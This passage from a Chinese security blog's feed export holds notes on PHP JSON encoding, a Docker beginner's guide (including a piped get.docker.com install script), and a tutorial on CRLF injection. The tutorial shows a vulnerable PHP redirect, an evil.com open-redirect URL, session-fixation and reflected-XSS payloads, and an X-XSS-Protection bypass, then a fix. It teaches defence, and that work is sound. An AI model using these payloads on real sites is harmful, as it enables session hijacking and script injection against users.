<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;&quot;name&quot;:&quot;sachin&quot;,&quot;hobbies&quot;:&quot;sports&quot;,&quot;birthdate&quot;:&quot;08\/05\/1974 12:20:03 pm&quot;&#125;</div></pre></td></tr></table></figure>
<h4 id="json-decode"><a href="#json-decode" class="headerlink" title="json_decode"></a>json_decode</h4><p>PHP json_decode() 函数用于对 JSON 格式的字符串进行解码，并转换为 PHP 变量。</p>
<h5 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mixed json_decode ($json [,$assoc = false [, $depth = 512 [, $options = 0 ]]])</div></pre></td></tr></table></figure>
<h5 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h5><ul>
<li>json_string: 待解码的 JSON 字符串，必须是 UTF-8 编码数据</li>
<li>assoc: 当该参数为 TRUE 时，将返回数组，FALSE 时返回对象。</li>
<li>depth: 整数类型的参数，它指定递归深度</li>
<li>options: 二进制掩码，目前只支持 JSON_BIGINT_AS_STRING 。</li>
</ul>
<h5 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h5><p>以下实例演示了如何解码 JSON 数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">   $json = &apos;&#123;&quot;a&quot;:1,&quot;b&quot;:2,&quot;c&quot;:3,&quot;d&quot;:4,&quot;e&quot;:5&#125;&apos;;</div><div class="line"></div><div class="line">   var_dump(json_decode($json));</div><div class="line">   var_dump(json_decode($json, true));</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>以上代码执行结果为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">object(stdClass)#1 (5) &#123;</div><div class="line">    [&quot;a&quot;] =&gt; int(1)</div><div class="line">    [&quot;b&quot;] =&gt; int(2)</div><div class="line">    [&quot;c&quot;] =&gt; int(3)</div><div class="line">    [&quot;d&quot;] =&gt; int(4)</div><div class="line">    [&quot;e&quot;] =&gt; int(5)</div><div class="line">&#125;</div><div class="line"></div><div class="line">array(5) &#123;</div><div class="line">    [&quot;a&quot;] =&gt; int(1)</div><div class="line">    [&quot;b&quot;] =&gt; int(2)</div><div class="line">    [&quot;c&quot;] =&gt; int(3)</div><div class="line">    [&quot;d&quot;] =&gt; int(4)</div><div class="line">    [&quot;e&quot;] =&gt; int(5)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="PHP-amp-JSON中文显示问题"><a href="#PHP-amp-JSON中文显示问题" class="headerlink" title="PHP&amp;JSON中文显示问题"></a>PHP&amp;JSON中文显示问题</h3><h4 id="PHP输出JSON格式"><a href="#PHP输出JSON格式" class="headerlink" title="PHP输出JSON格式"></a>PHP输出JSON格式</h4><p>把数组直接输出为JSON</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$arr = array(&apos;姓名&apos;=&gt;&apos;小李&apos;,&apos;年龄&apos;=&gt;&apos;18&apos;);</div><div class="line">$json = json_encode($arr);</div><div class="line">echo $json;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>输出的结果为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;&quot;\u59d3\u540d&quot;:&quot;\u5c0f\u674e&quot;,&quot;\u5e74\u9f84&quot;:&quot;18&quot;&#125;</div></pre></td></tr></table></figure>
<p>中文字符被编码成了Unicode</p>
<p>做如下处理，把输出结果匹配一下，把Unicode还原成了汉字</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$arr = array(&apos;姓名&apos;=&gt;&apos;小李&apos;,&apos;年龄&apos;=&gt;&apos;18&apos;);</div><div class="line">$json = json_encode($arr);</div><div class="line">echo $json;</div><div class="line">echo &apos;&lt;/br&gt;&apos;;</div><div class="line">echo decodeUnicode($json);</div><div class="line"> </div><div class="line">function decodeUnicode($str)&#123;</div><div class="line">  return preg_replace_callback(&apos;/\\\\u([0-9a-f]&#123;4&#125;)/i&apos;,</div><div class="line">    create_function(</div><div class="line">      &apos;$matches&apos;,</div><div class="line">      &apos;return mb_convert_encoding(pack(&quot;H*&quot;, $matches[1]), &quot;UTF-8&quot;, &quot;UCS-2BE&quot;);&apos;</div><div class="line">    ),</div><div class="line">    $str);</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>输出的结果为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&#123;&quot;\u59d3\u540d&quot;:&quot;\u5c0f\u674e&quot;,&quot;\u5e74\u9f84&quot;:&quot;18&quot;&#125;</div><div class="line">&#123;&quot;姓名&quot;:&quot;小李&quot;,&quot;年龄&quot;:&quot;18&quot;&#125;</div></pre></td></tr></table></figure>
<p>同时PHP5.4版本，已经给Json新增了一个选项: JSON_UNESCAPED_UNICODE。加上这个选项后，就不会自动把中文编码了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$arr = array(&apos;姓名&apos;=&gt;&apos;小李&apos;,&apos;年龄&apos;=&gt;&apos;18&apos;);</div><div class="line">$json = json_encode($arr, JSON_UNESCAPED_UNICODE);</div><div class="line">echo $json;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>输出的结果为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;&quot;姓名&quot;:&quot;小李&quot;,&quot;年龄&quot;:&quot;18&quot;&#125;</div></pre></td></tr></table></figure>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://www.runoob.com/php/php-json.html" target="_blank" rel="external">PHP JSON | 菜鸟教程</a><br><a href="http://www.ruanyifeng.com/blog/2009/05/data_types_and_json.html" target="_blank" rel="external">数据类型和Json格式</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>Docker基础与实战</title>
    <link href="http://uknowsec.cn/posts/notes/Docker%E5%9F%BA%E7%A1%80%E4%B8%8E%E5%AE%9E%E6%88%98.html"/>
    <id>http://uknowsec.cn/posts/notes/Docker基础与实战.html</id>
    <published>2017-09-14T10:54:55.000Z</published>
    <updated>2017-09-14T13:25:24.692Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h1 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>Linux中两种Docker安装方法，一种是使用Docker提供的自动安装脚本，另一种是使用Linux发行版的packaging system直接安装</p>
<h3 id="自动安装脚本"><a href="#自动安装脚本" class="headerlink" title="自动安装脚本"></a>自动安装脚本</h3><p>Docker自动识别Linux发行版的类型，提供用于安装Docker包的脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo wget -q0- https://get.docker.com/ | sh</div></pre></td></tr></table></figure>
<p>使用get.docker.com脚本安装Docker时，hello-world镜像也会自动安装。由于不使用hello-world镜像，故将其全部删除</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo docker rm `sudo docker ps -aq`</div><div class="line">sudo docker rmi hello-world</div></pre></td></tr></table></figure>
<h2 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo apt-get update</div><div class="line">sudo apt-get install docker.io</div><div class="line">sudo ln -sf /usr/bin/docker.io /usr/local/bin/docker</div></pre></td></tr></table></figure>
<p>将/usr/bin/docker.io可执行文件链接到/usr/local/bin/docker并使用</p>
<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/boot2docker/windows-installer/releases</div></pre></td></tr></table></figure>
<h1 id="使用Docker"><a href="#使用Docker" class="headerlink" title="使用Docker"></a>使用Docker</h1><p>Docker命令格式为docker&lt;命令&gt;,比如docker run、docker push，且必须总是以root权限运行</p>
<h2 id="使用search命令搜索镜像"><a href="#使用search命令搜索镜像" class="headerlink" title="使用search命令搜索镜像"></a>使用search命令搜索镜像</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker search ubuntu</div></pre></td></tr></table></figure>
<h2 id="使用pull命令下载镜像"><a href="#使用pull命令下载镜像" class="headerlink" title="使用pull命令下载镜像"></a>使用pull命令下载镜像</h2><p>从Docker hub下载Ubuntu Linux镜像</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker pull ubuntu:latest</div></pre></td></tr></table></figure>
<h2 id="使用images命令列出镜像目录"><a href="#使用images命令列出镜像目录" class="headerlink" title="使用images命令列出镜像目录"></a>使用images命令列出镜像目录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker images</div></pre></td></tr></table></figure>
<p>docker images命令用于列出本地主机中所有镜像。在该命令中设置镜像名称—比如docker images ubuntu—则只列出名称相同但标签不同的镜像</p>
<h2 id="使用run命令创建容器"><a href="#使用run命令创建容器" class="headerlink" title="使用run命令创建容器"></a>使用run命令创建容器</h2><p>使用镜像创建容器后，运行Bash shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker run -i -t --name hello ubuntu /bin/bash</div></pre></td></tr></table></figure>
<p>命令格式为docker run&lt;选项&gt;&lt;镜像名称&gt;&lt;要运行的文件&gt;。将ubuntu镜像创建为容器后，运行ubuntu镜像中的/bin/bash。也可以不用镜像名称而用镜像ID</p>
<ul>
<li>使用 -i(interactive)、-t(Pseudo-tty)选项可以在运行的Bash shell中进行输入与输出</li>
<li>使用 –name选项可以指定容器名称。若不指定名称，Docker会自动生成名称并进行指定</li>
</ul>
<h2 id="使用ps命令查看容器列表"><a href="#使用ps命令查看容器列表" class="headerlink" title="使用ps命令查看容器列表"></a>使用ps命令查看容器列表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker ps -a</div></pre></td></tr></table></figure>
<h2 id="使用start命令启动容器"><a href="#使用start命令启动容器" class="headerlink" title="使用start命令启动容器"></a>使用start命令启动容器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker start hello</div></pre></td></tr></table></figure>
<p>命令格式为docker start&lt;容器名称&gt;,也可以使用容器ID替代容器名称</p>
<h2 id="使用restart命令重启容器"><a href="#使用restart命令重启容器" class="headerlink" title="使用restart命令重启容器"></a>使用restart命令重启容器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker restart hello</div></pre></td></tr></table></figure>
<p>命令格式为docker restart&lt;容器名称&gt;,也可以使用容器ID替代容器名称</p>
<h2 id="使用attach命令连接容器"><a href="#使用attach命令连接容器" class="headerlink" title="使用attach命令连接容器"></a>使用attach命令连接容器</h2><p>执行如下命令后，再输入一次回车键，显示Bash shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker attach hello</div></pre></td></tr></table></figure>
<p>命令格式为docker attach&lt;容器名称&gt;,也可以使用容器ID替代容器名称<br>在Bash shell中输入exit或Ctrl+D终止容器，若依次输入Ctrl+P、Ctrl+Q则不会终止容器而只退出</p>
<h2 id="使用exec命令从外部运行容器内的命令"><a href="#使用exec命令从外部运行容器内的命令" class="headerlink" title="使用exec命令从外部运行容器内的命令"></a>使用exec命令从外部运行容器内的命令</h2><p>当前容器正以/bin/bash形式处于运行状态，也可以不通过/bin/bash而从外部运行容器内的命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker exec hello echo &quot;Hello World&quot;</div></pre></td></tr></table></figure></p>
<p>命令格式为docker exec&lt;容器名称&gt;&lt;命令&gt;&lt;形式参数&gt;,也可以使用容器ID替代容器名称。</p>
<h2 id="使用stop命令终止容器"><a href="#使用stop命令终止容器" class="headerlink" title="使用stop命令终止容器"></a>使用stop命令终止容器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker stop hello</div></pre></td></tr></table></figure>
<h2 id="使用rm命令删除容器"><a href="#使用rm命令删除容器" class="headerlink" title="使用rm命令删除容器"></a>使用rm命令删除容器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker rm hello</div></pre></td></tr></table></figure>
<p>命令格式为docker rm&lt;容器名称&gt;,也可以使用容器ID替代容器名称。</p>
<h2 id="使用rmi命令删除镜像"><a href="#使用rmi命令删除镜像" class="headerlink" title="使用rmi命令删除镜像"></a>使用rmi命令删除镜像</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker rmi ubuntu:latest</div></pre></td></tr></table></figure>
<p>命令格式为docker rm&lt;镜像名称&gt;:&lt;标签&gt;,也可以使用容器ID替代容器名称。</p>
<h1 id="创建Docker镜像"><a href="#创建Docker镜像" class="headerlink" title="创建Docker镜像"></a>创建Docker镜像</h1><h2 id="编写Dockerfile"><a href="#编写Dockerfile" class="headerlink" title="编写Dockerfile"></a>编写Dockerfile</h2><blockquote>
<p>example/Dockerfile<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">FROM ubuntu:14.04</div><div class="line">MAINTAINER Foo Bar &lt;foo@bar.com&gt;</div><div class="line"></div><div class="line">RUN apt-get update</div><div class="line">RUN apt-get install -y nginx</div><div class="line">RUN echo &quot;\ndaemon off;&quot; &gt;&gt; /etc/nginx/nginx.conf</div><div class="line">RUN chown -R www-date:www-date /var/lib/nginx</div><div class="line"></div><div class="line">VOLUME [&quot;/date&quot;, &quot;/etc/nginx/site-enabled&quot;, &quot;/var/log/nginx&quot;]</div><div class="line"></div><div class="line">WORKDIR /etc/nginx</div><div class="line"></div><div class="line">CMD [&quot;nginx&quot;]</div><div class="line"></div><div class="line">EXPOSE 80</div><div class="line">EXPOSE 443</div></pre></td></tr></table></figure></p>
</blockquote>
<ul>
<li>FROM:指定基于的基础镜像。Docker镜像基于已创建的镜像。指令格式为&lt;镜像名称&gt;&lt;标签&gt;</li>
<li>MAINTAINER:维护者信息</li>
<li>RUN:运行shell脚本或命令</li>
<li>CMD:指定容器启动时执行的文件或shell脚本</li>
<li>WORKDIR:为CMD中设置的可执行文件设置运行目录</li>
<li>EXPOSE:与主机相连的端口号</li>
</ul>
<h2 id="使用build命令创建镜像"><a href="#使用build命令创建镜像" class="headerlink" title="使用build命令创建镜像"></a>使用build命令创建镜像</h2><p>Dockerfile文件编写完成后，在保存Dockerfile文件的example目录执行如下命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker build --tag hello:0.1</div></pre></td></tr></table></figure></p>
<p>命令格式为docker build &lt;选项&gt;<dockerfile 路径="">。使用–tag选项可以设置镜像名称与标签。</dockerfile></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker run --name hello-nginx -d -p 80:80 -v /root/data:/data hello:0.1</div></pre></td></tr></table></figure>
<ul>
<li>-d 选项在后台运行容器</li>
<li>-p 80:80选项将主机的80端口与容器的80端口连接起来，并暴露到外部。这样设置后，连接http://&lt;主机IP&gt;:80就会连接到容器的80号端口</li>
<li>-v /root/data:/data选项将主机的/root/data目录连接到容器的/data目录。若将文件放入/root/data目录，则能从容器读取相应文件。</li>
</ul>
<h1 id="查看Docker"><a href="#查看Docker" class="headerlink" title="查看Docker"></a>查看Docker</h1><h2 id="使用history命令查看镜像历史"><a href="#使用history命令查看镜像历史" class="headerlink" title="使用history命令查看镜像历史"></a>使用history命令查看镜像历史</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker history hello:0.1</div></pre></td></tr></table></figure>
<p>命令格式为docker history&lt;镜像名称&gt;:&lt;标签&gt;</p>
<h2 id="使用cp命令复制文件"><a href="#使用cp命令复制文件" class="headerlink" title="使用cp命令复制文件"></a>使用cp命令复制文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker cp hello-nginx:/etc/nginx/nginx.conf ./</div></pre></td></tr></table></figure>
<p>命令格式为docker cp&lt;容器名称&gt;:&lt;路径&gt;&lt;主机路径&gt;</p>
<h2 id="使用commit命令从容器的修改中创建镜像"><a href="#使用commit命令从容器的修改中创建镜像" class="headerlink" title="使用commit命令从容器的修改中创建镜像"></a>使用commit命令从容器的修改中创建镜像</h2><p>docker commit 命令从容器的修改中创建新的镜像<br>假设hello-nginx容器中的文件内容发生变化，将容器创建为镜像文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker commit -a &quot;Foo Bar &lt;foo@bar.com&gt;&quot; -m &quot;add hello.txt&quot; hello-nginx hello:0.2</div></pre></td></tr></table></figure>
<p>命令格式为docker commit &lt;选项&gt;&lt;容器名称&gt;&lt;镜像名称&gt;：&lt;标签&gt;</p>
<p>-a “Foo Bar<a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#x6f;&#x3a;&#x66;&#x6f;&#x6f;&#64;&#x62;&#97;&#114;&#46;&#99;&#111;&#x6d;">&#x66;&#x6f;&#x6f;&#64;&#x62;&#97;&#114;&#46;&#99;&#111;&#x6d;</a>“与 -m “add hello.txt”选项用于设置提交的用户与注册信息。将hello-nginx容器创建hello:0.2镜像</p>
<h2 id="使用diff命令检查容器文件的修改"><a href="#使用diff命令检查容器文件的修改" class="headerlink" title="使用diff命令检查容器文件的修改"></a>使用diff命令检查容器文件的修改</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker diff hello-nginx</div></pre></td></tr></table></figure>
<p>命令格式为docker diff&lt;容器名称&gt;，A为添加文件，C为修改的文件，D为删除的文件。</p>
<h2 id="使用inspect命令查看详细信息"><a href="#使用inspect命令查看详细信息" class="headerlink" title="使用inspect命令查看详细信息"></a>使用inspect命令查看详细信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker inspect hello-nginx</div></pre></td></tr></table></figure>
<p>命令格式为docker inspect&lt;容器名称&gt;</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>CRLF Injection漏洞利用与学习</title>
    <link href="http://uknowsec.cn/posts/notes/CRLF-Injection%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html"/>
    <id>http://uknowsec.cn/posts/notes/CRLF-Injection漏洞利用与学习.html</id>
    <published>2017-08-24T04:48:23.000Z</published>
    <updated>2017-08-25T06:39:14.805Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="CRLF简介"><a href="#CRLF简介" class="headerlink" title="CRLF简介"></a>CRLF简介</h2><p>CRLF是”回车 + 换行”（\r\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。</p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="PHP-header-函数"><a href="#PHP-header-函数" class="headerlink" title="PHP header() 函数"></a>PHP header() 函数</h3><h4 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h4><p>header() 函数向客户端发送原始的 HTTP 报头。</p>
<p>认识到一点很重要，即必须在任何实际的输出被发送之前调用 header() 函数（在 PHP 4 以及更高的版本中，您可以使用输出缓存来解决此问题）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">// 结果出错</div><div class="line">// 在调用 header() 之前已存在输出</div><div class="line">header(&apos;Location: http://www.example.com/&apos;);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">header(string,replace,http_response_code)</div></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定要发送的报头字符串。</td>
</tr>
<tr>
<td>replace</td>
<td style="text-align:center">可选。指示该报头是否替换之前的报头，或添加第二个报头。默认是 true（替换）。false（允许相同类型的多个报头）。</td>
</tr>
<tr>
<td>http_response_code</td>
<td style="text-align:center">可选。把 HTTP 响应代码强制为指定的值。（PHP 4 以及更高版本可用）</td>
</tr>
</tbody>
</table>
<h4 id="提示和注释"><a href="#提示和注释" class="headerlink" title="提示和注释"></a>提示和注释</h4><p>注释：从 PHP 4.4 之后，该函数防止一次发送多个报头。这是对头部注入攻击的保护措施。</p>
<h3 id="URL重定向-跳转"><a href="#URL重定向-跳转" class="headerlink" title="URL重定向/跳转"></a>URL重定向/跳转</h3><p>对于URL跳转的实现一般会有几种实现方式：</p>
<ul>
<li>META标签内跳转</li>
<li>javascript跳转</li>
<li>header头跳转</li>
</ul>
<p>通过以GET或者POST的方式接收将要跳转的URL，然后通过上面的几种方式的其中一种来跳转到目标URL。一方面，由于用户的输入会进入Meta，javascript，http头所以都可能发生相应上下文的漏洞，如xss等等，但是同时，即使只是对于URL跳转本身功能方面就存在一个缺陷，因为会将用户浏览器从可信的站点导向到不可信的站点，同时如果跳转的时候带有敏感数据一样可能将敏感数据泄漏给不可信的第三方。</p>
<p>譬如一个典型的登录跳转如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$url=$_GET[&apos;jumpto&apos;];</div><div class="line"></div><div class="line">header(&quot;Location: $url&quot;);</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>如果jumpto没有任何限制，所以恶意用户可以提交<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.wooyun.org/login.php?jumpto=http://www.evil.com</div></pre></td></tr></table></figure></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul>
<li>利用CRLF Injection设置一个SESSION,造成一个“会话固定漏洞”</li>
<li>利用CRLF Injection造成一个无视浏览器Filter的反射型XSS</li>
</ul>
<h3 id="会话固定漏洞"><a href="#会话固定漏洞" class="headerlink" title="会话固定漏洞"></a>会话固定漏洞</h3><p>一般网站会在HTTP头中用Location: <a href="http://baidu.com" target="_blank" rel="external">http://baidu.com</a> 这种方式来进行302跳转，所以我们能控制的内容就是Location:后面的XXX某个网址。</p>
<p>所以一个正常的302跳转包是这样：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 302 Moved Temporarily </div><div class="line">Date: Fri, 27 Jun 2014 17:52:17 GMT </div><div class="line">Content-Type: text/html </div><div class="line">Content-Length: 154 </div><div class="line">Connection: close </div><div class="line">Location: http://www.sina.com.cn</div></pre></td></tr></table></figure></p>
<p>但如果我们输入的是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.sina.com.cn%0aSet-cookie:JSPSESSID%3Dwooyun</div></pre></td></tr></table></figure></p>
<p>注入了一个换行，此时的返回包就会变成这样： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 302 Moved Temporarily </div><div class="line">Date: Fri, 27 Jun 2014 17:52:17 GMT </div><div class="line">Content-Type: text/html </div><div class="line">Content-Length: 154 </div><div class="line">Connection: close </div><div class="line">Location: http://www.sina.com.cn </div><div class="line">Set-cookie: JSPSESSID=wooyun</div></pre></td></tr></table></figure>
<p>这个时候这样我们就给访问者设置了一个SESSION，造成一个“会话固定漏洞”。</p>
<h3 id="过Filter的反射型XSS"><a href="#过Filter的反射型XSS" class="headerlink" title="过Filter的反射型XSS"></a>过Filter的反射型XSS</h3><p>HRS并不仅限于会话固定，通过注入两个CRLF就能造成一个无视浏览器Filter的反射型XSS。</p>
<p>比如一个网站接受url参数 <a href="http://test.sina.com.cn/?url=xxx" target="_blank" rel="external">http://test.sina.com.cn/?url=xxx</a> ，xxx放在Location后面作为一个跳转。如果我们输入的是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://test.sina.com.cn/?url=%0d%0a%0d%0a&lt;img src=1 onerror=alert(/xss/)&gt;</div></pre></td></tr></table></figure></p>
<p>我们的返回包就会变成这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 302 Moved Temporarily </div><div class="line">Date: Fri, 27 Jun 2014 17:52:17 GMT </div><div class="line">Content-Type: text/html </div><div class="line">Content-Length: 154 </div><div class="line">Connection: close </div><div class="line">Location:</div><div class="line">&lt;img src=1 onerror=alert(/xss/)&gt;</div></pre></td></tr></table></figure>
<p>之前说了浏览器会根据第一个CRLF把HTTP包分成头和体，然后将体显示出来。于是我们这里这个标签就会显示出来，造成一个XSS。</p>
<p>为什么说是无视浏览器filter的，这里涉及到另一个问题。</p>
<p>浏览器的Filter是浏览器应对一些反射型XSS做的保护策略，当url中含有XSS相关特征的时候就会过滤掉不显示在页面中，所以不能触发XSS。</p>
<p>怎样才能关掉filter？一般来说用户这边是不行的，只有数据包中http头含有X-XSS-Protection并且值为0的时候，浏览器才不会开启filter。</p>
<p>说到这里应该就很清楚了，HRS不正是注入HTTP头的一个漏洞吗，我们可以将X-XSS-Protection:0注入到数据包中，再用两个CRLF来注入XSS代码，这样就成功地绕过了浏览器filter，并且执行我们的反射型XSS。</p>
<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>过滤\r 、\n之类的换行符，避免输入的数据污染到其他HTTP头。</p>
